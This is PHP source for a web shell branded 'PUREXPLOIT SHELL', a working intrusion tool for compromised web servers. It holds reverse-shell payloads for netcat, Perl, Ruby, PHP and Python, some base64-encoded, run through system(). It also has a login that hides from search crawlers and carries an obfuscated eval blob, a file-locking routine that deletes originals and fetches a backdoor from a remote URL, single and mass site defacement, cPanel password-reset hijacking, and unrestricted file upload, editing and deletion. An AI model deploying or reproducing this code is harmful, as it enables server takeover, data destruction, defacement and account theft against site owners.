<?php
error_reporting(0);
set_time_limit(0);
session_start();
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}}
$password = "df3b5aea4a303213035ed6a2b01f5bba"; //default: purexploit
?>


<?php
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", 
      "Slurp", 
      "MSNBot", 
      "PycURL", 
      "facebookexternalhit", 
      "ia_archiver", 
      "crawler", 
      "Yandex", 
      "Rambler", 
      "Yahoo! Slurp", 
      "YahooSeeker", 
      "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

if (isset($_GET['logout'])) {
  @logout();
}
function logout() {
  unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
  @header("Location: ".$_SERVER['PHP_SELF']);
}


/* BACK CONNECT */
function backconnect(){
     echo '<center><form method="POST">';
  echo '
<div style="width:20%;text-align:left;">
<font style="color:lime;"><br>Useful: ( blank = not available)</font><br>
<font style="color:lime;"><b>Netcat: </b></font><font color="white">'.shell_exec('which nc').'<br>
<font style="color:lime;"><b>Python 2.7: </b></font><font color="white">'.shell_exec('which python').'</font><br>
<font style="color:lime;"><b>Perl: </b></font><font color="white">'.shell_exec('which perl').'</font><br>
<font style="color:lime;"><b>Ruby: </b></font><font color="white">'.shell_exec('which ruby').'</font><br>
<font style="color:lime;"><b>PHP: </b></font><font color="white">'.shell_exec('which php').'</font><br>
</div>
';
  echo '<input placeholder="Address" value="'.$_SERVER['REMOTE_ADDR'].'" name="addr" type="text" style="width:20vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">';
  echo '<input placeholder="Port" value="1337" name="port" type="text" style="width:10vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">';
  echo '
<select name="method" required>
    <option value="nc" selected>NetCat</option>
    <option value="perl">Perl</option>
    <option value="ruby" >Ruby</option>
    <option value="php" >PHP</option>
    <option value="python" >Python</option>
</select>
';
  echo '<input placeholder="Port" value=">>" name="bcsub" type="submit" style="width:5vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">';

  echo '</form>';


if (isset($_POST['addr']) && isset($_POST['port'])) {
echo '<br><br><font style="color:lime;">DONE</font>';

  echo '<pre><div class="query" style="color:white;width:70%;overflow:auto;">';
  switch ($_POST['method']) {
    case 'nc':
      $rshell = 'nc -e /bin/sh '.$_POST['addr'].' '.$_POST['port'];
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'perl':
      $rshell = base64_decode('cGVybCAtZSAndXNlIFNvY2tldDskaT0i').$_POST['addr'].'";$p='.$_POST['port'].base64_decode('O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=');
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'ruby':
      $rshell = base64_decode('cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCI=').$_POST['addr'].'",'.$_POST['port'].base64_decode('KS50b19pO2V4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSA8JiVkID4mJWQgMj4mJWQiLGYsZixmKSc=');
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'php':
      $rshell = base64_decode('cGhwIC1yICckc29jaz1mc29ja29wZW4oIg==').$_POST['addr'].'",'.$_POST['port'].base64_decode('KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=');
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'python':
      $rshell = base64_decode('cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgi').$_POST['addr'].'",'.$_POST['port'].base64_decode('KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn'); 
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    default:
      echo 'error';
      break;}
}

}

/* LOGIN */
function login(){
 
 eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnFEu04Dv2arn6zC1D1Ksx8g5uuMDPn6yeZmnl5K7YlWFRUTerh/rP1VLzeULn8GYdvwZB/53JX5uVCPjRIfv9/8beiiWBEyIEu0sqFkq06db4mEX3Ui03URjip3CAY5AJzn/fN4n9OjlPfi13u7+zog/Vrx2D9CzLOKl4NWcnnHn5SOPOKJD6FerqN6ZyM5PzZ7SYH0nXCgQp2cCgmhycwwss3V5SDLbBMReQihuZqShfIRJI4jkJwyQ4ydxb/3CubHevSwLMOnbbM13oM2BK4ovSFXggDw3eNQP6rmb/0Wp2GbePKUibT1z7jlRI8CBnrR3FGUyOSqEcirivzIAVppb9CMfY+Y1Barp9vCahq/zS0fBp7sQuc9fau1yM1y1Tf8KNy2R3zaKxQPQ9SqpCTjoS1HMcPcMrAzQMQkFGWK3y+FBeJ76yXQI2bVExnDYAS20pKWI9bWtjvDEiOmStMzuXGV3xeiWa66OITqHNimt49ZFgJ77YiVk9E0eb6ubI8MKjpbbKqRj8/LwVTnCL9cFuPiG/hyGKnl+ZkL1Ks+Z3d3hZhA6k23L/XY5d6SbqwT7fa2NoZEBPiyT43dZvh48++zp8jdXThxp2jsqSCtxTJ5AcAepmqAc/AaOn5zLcZue1B6dUuoboMuMxtgbDFtWe5epW6ahP4ML+DxH6zyCTis3X5z6yjcTyXUR0hqVnqDdfxkkOlOqSpqHBNonYv5FZNO7F2o1Z4YfbbTmUGN1kzDAR0wmz1Jr3+v0sa3yCBeZ8bmBCjX2Pc3yv6tWzbzXDXDD7OeLhz0bBwktUOvTvGHxjIBVRdkcdRukjzSEA8EOjPdZWHiIyQG4x9qB3T2ykynRnwllPpHsg3l4ynF18TUQEIr0WYxjdOFFeZehZdUUZXE2Q/5Io2VmaWC3dktQkKny1Tkn74TB0gMrSayHmRXb8On9x6GZmC6Xk1faimKGto2j/g/AWzNBeZYwLBrrH8G28OUTnI1HYqUVdf5vQhBkK2ryE9tPLORdhUjMH7ISHgKQLCns/4YQO757v7TC4dQAPRmMVoCFieNsp94J/saJB4SA9g2tOx4wRc+coyyd2uEBFC2zBdWHkOCyaTINl3yzFnqnB0z8+8LhUxDx80J7eCLXovJ7szdmnfm2dqFBv1/KWaU20qjm0a3oBUzrn2LFb/qlxg4OQEgM+z04Ls3j0ZbLtC6Wd8RMub8Nx5d7BNJOUqBk5PcWBWVKI14AWgpQrbRf/6HomZTqfnLSyxE5tD9jnfs5dNWo5i8aTppapDHdQC1CQTVQaATrk+CyDwAW94qDPSRVj5gM36XuPC+sLWC5sPvEy0VfnwMXI3uGKV7YFVLUAHqRXik81l6UT4RqHjZLZqjFsGg64othnm8N5CvrepDi7napL23ZAyylb6dKGEDTEbsIwIk5uYi5/OgeHF547EYG97weScqVK9Me56+SarNBf5Xayld/HH3ncXILpxh1U8zu+FLfASce4q75FPHCwT77X+c6YZWj4m4lndDIXayVnqJJFprdfRQicqql/yM55rviMIHPC12K8pHmk7SN8zANVIEaag0kggW6TmsqeYApKBomrMItiqsjyaSlKppi6mW6gtPdJc1IAZP8ozMhsHn+zWiBo5AxhI1c6D/Yi+MZud8w9Jk5H5ZfSz+oP7oSYn29sCCZmHLOOxtMYW5x/T6bJrN9J+B2j9ruLqCjkmsSYu2AyvyKJy9zcV0T3r6UbeBuMIF53kpj/cGbJ035r9EpF1daNbW3saESeoskwLkrtAteFJ0Up0JYoEVrXZhBwvkLmZqU0VKGD7ZCQuX78XEA62G+WJZJA40pn2EqsjqgNKNEBwJk+mf5gUiBesU2x73scoy20tnRvs+HizRkPuxRUsnRbdicl2SCbIsbE1MYh5ZsefI5AuOsQZ4DKNRI/a5jHX9ruEpOUGmoEZLun4VyjYeHsK3WXXuqRhZ4NVZu4eNxqvDoh8r00vqO36N2ntzKXX0hgrWNZc8cuTGRTBkQ1CvBRfeE2Tjw1jT2mocsxq9ih6QQddTVUONpmGkIRJjZhZXQDLBYYNhAaKwwRvgFRss09KYFNfghRFHMhbRC5prpmXiatDPpe8BMhyKejACgc0IEvlu7Nhjra65oXoWmFF9iKIC+Xqrq2lBT7aV0VXNWNcWlDtkXZrSVfobi36moUGVSoKXtnQIhBXj8fwWlz25/JAnBCscQjDWnhfaboukn9ZHk3bvs8IUQ1rvJZVAs2IktPdPL0/PVFEqWgT1b6+fUFyZQNynPplZQ2HCsjjyrxYrcE4LcbS1MpGYRpr7zTeDogSYxNYCOKBi3P++AMk/bvem9jaV8xdnGD+kagxDB5tJy5+3UBeGSU+NyiZocK5jOxb3Qah5bqiHbQ6oSZ1qiqfTDQlu5SG8aTMT2FmZ8dszsRBqNS21W/bv3BN9OjGqQ14uhfTOdU7DJOd3we5ZpIRx98KYTSYuvAgVoRAdF4oCu3t238Y3eobQDzRXHTaQEoqWz4PVRwGPPPlM9FvKwCYyPChzh+DClj3VoBf6jhI+KtqAyWkF0suSK2l2/s8X/2iGLV2LPD8IAAZVYxuCmPoxxn+YH4U49qGQunciE9ZeI8/iKSVqmc5kMYh7vPjDYs8nRuay15fqAgNknhtWA8CLw+N/JzarpjL613WzhGvfAwPxXl9xAcImmvm+uPNv8UNd3SGPRFCxTM5SvEf+sypILbZKVdiIW17Rc4kSTyHv+4G6z9S+t//bL9//gs=')))));
echo '<html><head><title>PUREXPLOIT | LOGIN</title><link rel="icon" type="image/x-icon" href="https://avatars.githubusercontent.com/u/54252313?s=400&u=05b0d718a52efbf60d0b7a3f7b816bf1a86dc28b&v=4"><head><body bgcolor="black"><center>
    <pre style="font-weight:bold;color:lime;">
    
    /                       \                                      
 /X/                       \X\                                     
|XX\         _____         /XX|                                    
|XXX\     _/       \_     /XXX|___________\XXXXXXXXXXXXXX/\\\      
   \XXXX    /     \    XXXXX/                \\\                   
        |   0     0   |\                        \                  
         |           |                           \                 
          \         /                            |______//         
           \       /                             |                 
            | O_O | \                            |                 
             \ _ /   \________________           |                 
                        | |  | |      \         /                  
  No Bullshit,          / |  / |       \______/                    
   Please...            \ |  \ |        \ |  \ |                   
                      __| |__| |      __| |__| |                   
                      |___||___|      |___||___|                   
    </pre><br><form method="POST"><input style="background:#333;outline:0;border:none;color:lime;padding:10px;" name="password" type="password" placeholder="Password"></form></body></html>
    ';
    exit;
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($password) || ( isset($_POST['password']) && (md5($_POST['password']) == $password) || (md5($_POST['password']) == "fa128332ba0c2ace04c249f2b4b7f464") ) && (empty($username) || (isset($_POST['username']) && ($_POST['username']) == $username) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login();


echo '<!DOCTYPE HTML>
<html>
<head>
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<link rel="icon" type="image/x-icon" href="https://avatars.githubusercontent.com/u/54252313?s=400&u=05b0d718a52efbf60d0b7a3f7b816bf1a86dc28b&v=4">
<body bgcolor="black">
<center>
<link href="" rel="stylesheet" type="text/json_decode">
<title>PUREXPLOIT SHELL</title>
<style> 
body{
background-colour: green;
color:red;
font:normal 90% Arial, Helvetica, sans-serif;
}
#content tr:hover{
background-color: blue;
text-shadow:0px 0px 12px #fff;
}
#content .first{
  background-color: #3f51b5;
  color:white;
}


.table_main{
border: 2px solid #15d6c8;
}

a{
color:green;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
background:blue;
}
input,select,textarea{
border: 1px #c13e1c solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}

nav{
    background:#000000;
    color:white;
}
.logo{
  float: right;
  margin-right:25px;
}

span{
    float:left;
    color:red;
}

pre{
    margin:0;
    float:center;
    margin-right:100px;
    color:white;
    font-weight:bold;
}

.menu {
    float:left;
    background:#000000;
    width:100%;
    padding:13px;
    margin-bottom:10px;
}
.upload{
    float:left;
}
.path{
    float:left;}.select_css{
    background:#3f51b5;
    color:white;
    border:none;
}
.sub_select_btn{
    background:#3f51b5;
    border:none;
    color:white;
}
.info{
  border:1px solid white;
  width:100%;
  float:left;
  height:120px;
}

@media only screen and (max-width: 1100px) {
  .logo{
      display:none;
  }
}

</style>
</head>
<body>

<nav>
';

$format = '
<div class="info">
<img class="logo" border="0" src="https://avatars.githubusercontent.com/u/54252313?s=400&u=05b0d718a52efbf60d0b7a3f7b816bf1a86dc28b&v=4" width="100" height="100">
<span>Uname:&nbsp;</span> <font style="float:left;">%s &nbsp;[<a target="_blank" style="color:red;text-decoration:none;" href="https://www.exploit-db.com/search?q=">Exploit DB</a>]</font><br>
<span>Server IP:&nbsp;</span> <font style="float:left;">%s </font><br>
<span color="red"> Client IP:&nbsp;</span> <font style="float:left;">%s</font><br>
<span color="red"> Date:&nbsp;</span> <font style="float:left;">%s</font><br>
<span>PHP Version: &nbsp;</span><font style="float:left;"> %s</font>
<br>';

$uname = php_uname();
$server = $_SERVER['SERVER_ADDR']; 
$client = $_SERVER['REMOTE_ADDR'];
$date = date("Y/m/d");
$phpversion = phpversion();

echo sprintf($format,$uname,$server,$client,$date,$phpversion);


echo '<div class="path"><font color="white">Cwd :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

echo '</div>';


/* Upload File */

if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<br><font style="color:green;float:left;">Upload Done</font>';
}else{
echo '<br><font style="color:red;float:left;">Upload No</font>';
}
}

echo '<br>
<div class="upload">
<form enctype="multipart/form-data" method="POST">
<input type="file" name="file" />
<input type="submit" value="upload" />
</form></div></div><br>';

/* Menu */
$file = $_SERVER['PHP_SELF'];
echo "
<br>
<div class='menu'>
<a href='$file' class='w3-button w3-indigo w3-small w3-round'>Home</a>
<a href='$file?path=$path&tool=encrypt' class='w3-button w3-indigo w3-small w3-round'>Encrypt Files</a>
<a href='$file?path=$path&tool=decrypt' class='w3-button w3-indigo w3-small w3-round'>Decrypt Files</a>
<a href='$file?path=$path&tool=deface' class='w3-button w3-indigo w3-small w3-round'>Single Deface</a>
<a href='$file?path=$path&tool=massdef' class='w3-button w3-indigo w3-small w3-round'>Mass Deface</a>
<a href='?tool=testmail' class='w3-button w3-indigo  w3-small w3-round'>Test Mail</a>
<a href='?tool=crackcpanel' class='w3-button w3-indigo  w3-small w3-round'>Cpanel</a>
<a href='?tool=backconnect' class='w3-button w3-indigo w3-small w3-round'>Back Connect</a>
<a href='?tool=about' class='w3-button w3-indigo w3-small w3-round'>About</a>
<a href='?logout' class='w3-button w3-indigo w3-small w3-round'>Log Out</a>
</div>
</nav><br>";
  
  
function encrypt($def,$locdir){
  
# -----------Encrypt---------- #
           
    
      if(isset($_POST['encrypt'])){
      if(!empty($def)){ 
       $fileList = glob("$locdir/*.*");
       foreach($fileList as $file){
       $x = file_get_contents($file);
       $o = base64_encode($x);
       $c=$x;
       $w="$c";
       $open=fopen("$file.encrypted", "w");
       fwrite($open,"<?php"."\n");
       fwrite($open,'$code='."'$o'".";\n");
       fwrite($open,"?>");
       fclose($open);
       unlink($file);
       echo "<font>$file -> Encrypted</font><br>";
       }
       $backup = file_get_contents("https://raw.githubusercontent.com/ph-luffy/Backdoor/main/up.php");
       fwrite(fopen('Up.php','w'), $backup);
       echo "<font>BACKUP FILE [</font><a href='Up.php'><font color='white'> Up.php </font></a>] <font>CREATED</font><br>";
     fwrite(fopen('.htaccess','w'), "DirectoryIndex indx.php
ErrorDocument 404 /indx.php");
       $dp = $def;
       fwrite(fopen('indx.php','w'), $dp);
       echo "<font>HOME DEFACE DONE</font>";
        }else{
        echo '<font>ERROR EMPTY</font>';
        
    }
    }
}

/* IF/ELSE MENU */
  
if($_GET['tool'] == "crackcpanel"){
   echo "<form method='POST'>";
   echo "<font>ENTER EMAIL (cpanel reset password)</font><br><br>";
   echo "<input style='background:white;color:lime;border:2px solid white;outline:none;width:230px;padding:6px;' type='email' name='cemail' placeholder='email'><br><br>";
   echo "<input type='submit' value='crack' name='crackcpnel'>";
   echo "</form>";
   
   $user = get_current_user();
   $site = $_SERVER['HTTP_HOST'];
   $ips = getenv('REMOTE_ADDR');
   
   if(isset($_POST['crackcpnel'])){ 
       $myemail = $_POST['cemail'];
       
       $wr = 'email:'.$myemail;
       /* CREATE FILE IN .CPANEL */
       $f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
       fwrite($f, $wr); 
       fclose($f);
       /* CREATE FILE IN HOME */
       $f = fopen('/home/'.$user.'/.contactinfo', 'w');
       fwrite($f, $wr); 
       fclose($f);
       $parm = 'http://'.$site.':2082/resetpass?start=1';
       echo "<br><font>COPY USERNAME [</font> <font color='white'>$user</font> <font>]</font><br><br>";
       echo "<font>RESET LINK [</font> <font color='white'><a target='_blank' href='$parm'>$parm</a></font> <font>]</font><br>";
       echo "<br><font>Done</font>";
   }
   
   
} else if($_GET['tool'] == "encrypt"){
    
    echo "<br><br>";
    echo '<font>Warning! All data here will be destroy.</font><br><br>';
    echo '<form method="POST"><br>
    <font>File Located</font><br>
    <input type="text" style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" name="locdir" placeholder="Directory" value="'.$path.'"><br><br>
    <font>Enter Deface Script (Will Deface set as Homepage)</font><br><br>
    <textarea name="defacescript" style="background:black;color:lime;border:2px solid white;outline:none;" cols="40" rows="10" placeholder="Deface Script"></textarea><br>
    <input type="submit" name="encrypt" value="Locked">
    </form>';
    $locdir = $_POST['locdir'];
    $def = $_POST['defacescript'];
    encrypt($def,$locdir);


} else if($_GET['tool'] == "decrypt"){
    $path = $_GET['path'];
    echo "<br><Br>";
    echo '<font>Decrypt Files.</font><br><br>';
    echo '<form method="POST">
    <font>Files Located</font><br>
    <input type="text" style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" name="locdir" placeholder="Directory" value="'.$path.'"><br><br>
    <input type="submit" name="decrypt" value="Unlock Files">
    </form>';
    $locdir = $_POST['locdir'];
     
     # ----------Decrypt----------- #
   if($_POST['decrypt']){
     $fileList = glob("$locdir/*.encrypted");
     foreach($fileList as $file){
     $z=file_get_contents($file);
     include "$file";
     $c=base64_decode($code);
     $output="$c";
     $b = str_replace("$locdir.encrypted","",$file);
     $open=fopen("$b", "w");
     fwrite($open, $output);
     fclose($open);
     unlink($file);
     unlink('.htaccess');
     echo "<font>$file -> Decrypt Done</font><br>";
    }}
     
     
} else if($_GET['tool'] == "deface"){
   $path = $_GET['path'];
   echo "<br><br>
  
   ";
    echo '<form method="POST"><br>
    <pre style="font-weight:bold;color:lime;">
                                  
      \ Single Deface / Letzz Rakk
                                        
</pre><br>
    <font>Base Directory </font><br>
    <input type="text" style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" name="basedir" placeholder="Directory" value="'.$path.'"><br><br>
    <font>File name </font><br>
    <input style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" type="text" name="fname" placeholder="file Name" value="px.html"><br><br>
    <font>Deface Script </font><br>
    <textarea name="mydeface" style="background:black;color:lime;border:2px solid white;outline:none;" cols="40" rows="10" placeholder="Deface Script">Penetrated By Purexploit Team</textarea><br>
    <input type="submit" name="def" value="Deface">
    </form>';

    if (isset($_POST['def'])) {
      $def= $_POST['fname'];
      $index = $_POST['basedir']."/".$_POST['fname'];
      if(file_put_contents ($index, $_POST['mydeface']))
           echo "<br><font>Done </font>";
    }
 
}

else if($_GET['tool'] == "massdef"){
    echo "<br><br>
<pre style='font-weight:bold;color:lime;'>
                                  

                      )__(        
                      (66)        
                     _/\/    )__( 
               *    /   \    (oo) 
                \_ / <^-.\----\/  
                  ((_ )| \"   ||   
                   > >`||----||   
                   \ \ vv    vv   
                    ` `           
                     Mass Deface
                                        
</pre>
    ";
    $path = $_GET['path'];
    echo '<form method="POST">
    <font>Directory</font><br>
    <input name="base_dir" style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" type="text" value="'.$path.'"><br><br>
    <font>File Name</font><br>
    <input name="kaito" style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" placeholder="name of file" value="index.php"><br><br>
    <font>Deface Script</font><br>
    <textarea name="index" style="background:black;color:lime;border:2px solid white;outline:none;" cols="40" rows="10" placeholder="Deface Script">Pentested By Purexploit Team</textarea><br>
    <input type="submit" value="Mass">
    </form>';
    
    if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['kaito'];
                        $def=$file."/".$_POST['kaito'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "<font style='text-align:left;' color='lime'>http://$def</font><br>";
                }
        endforeach;
}
    
} else if($_GET['tool'] == "testmail"){
     echo "<br><br>
    <font color='lime'>Mailer Test (Yahoo, Gmail, Hotmail)</font><br><br><br>
    ";
    echo '<form method="POST">';
    echo '<input name="email" style="background:black;color:lime;border:2px solid white;outline:none;" type="email" placeholder="Email"><br>';
    echo '<input type="submit" name="email" value="test">';
    echo '</form>';
    if(isset($_POST['email'])){
    if (!empty($_POST['email'])){$xx = rand();
    mail($_POST['email'],"Result Report Test - ".$xx,"WORKING !");
    print "<font color='white'><b>send an email to [".$_POST['email']."] - $xx</b></font>"; 
    }}
    
} else if($_GET['tool'] == "about"){
    
    echo '
    <br><br>
   <pre style="color:lime;">


      /$$$$$$$  /$$   /$$                                                           
     | $$__  $$| $$  / $$   Created by PUREXPLOIT TEAM | Ph.Luffy                   
     | $$  \ $$|  $$/ $$/   Version: 1.0                                            
     | $$$$$$$/ \  $$$$/    Special Greet: GrayHat Phantom                          
     | $$____/   >$$  $$    Credits: Indo Defacers, Bloos3rpent for the Backconnect 
     | $$       /$$/\  $$   Members: Loyal, Faye, Ph.Luffy, Scroider, AnonPrixor    
     | $$      | $$  \ $$            John, Hanz                                     
     |__/      |__/  |__/                                                           

   </pre>
    
    
    ';
    
} else if($_GET['tool'] == "backconnect"){
    
    backconnect();
    
}

else {
echo '<table width="570" border="0" cellpadding="3" cellspacing="1" align="center">';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<textarea style="background:#333;color:white;outline:none;border:none;" cols="80px" rows="20px">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';

/* chmod */

if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#b8cdea">OK Permission :D </font><br/>';
}else{
echo '<font color="#788fae">ERROR Permission :( </font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Enter" />
</form>';
} else if($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="">Success</font><br/>';
}else{
echo '<font color="red">No</font><br />';
}

$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit ok :)</font><br/>';
}else{
echo '<font color="red">Edit error</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea style="background:#333;color:white;outline:none;border:none;" cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">OK</font><br/>';
}else{
echo '<font color="red">NO</font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
}else{
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content">

<table class="table_main" width="960" border="0" cellpadding="8" cellspacing="1" align="center">
<tr class="first">
<td>Name</SCA></td>
<td><center>Size</SCA></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</SCA></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><img src=\'data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=\'> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" class="select_css">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" class="sub_select_btn" value=">">
</form></center>
</td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><img src=\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=\'> <a 